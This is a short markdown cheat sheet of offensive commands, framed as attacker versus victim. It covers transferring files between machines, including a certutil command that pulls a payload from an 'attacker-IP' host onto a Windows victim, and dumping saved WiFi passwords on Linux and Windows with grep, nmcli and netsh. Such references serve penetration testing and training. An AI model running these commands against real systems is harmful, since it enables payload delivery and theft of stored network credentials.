# Useful Commands

## Linux

- Bash
  - transfer files between attacker/victim and vice versa
    - `python -m http.server 80`
      - start HTTP server in current directory
    - `python -m pyftpdlib -p 21 --write`
      - start FTP server in current directory
    - `wget http://victim-IP/path/to/file`
      - download file from victim
  - dump WiFi network passwords
    - `sudo grep -r '^psk=' /etc/NetworkManager/system-connections/`
      - of all remembered WiFi networks
    - `nmcli dev wifi show-password`
      - of currently connected WiFi network
  - loop through array and execute command on elements inside
    - `for i in "${array[@]}"; do <command> "$i"; done`

## Windows

- cmd
  - transfer files between attacker/victim and vice versa
    - `certutil -urlcache -f http://attacker-IP/path/to/payload payload`
      - download file to victim
    - `ftp attacker-IP`
      - connect to FTP server, to download/upload files
      - use anonymous login
  - dump WiFi network passwords
    - `netsh wlan show profiles name="$SSID" key=clear`
      - of all remembered WiFi networks
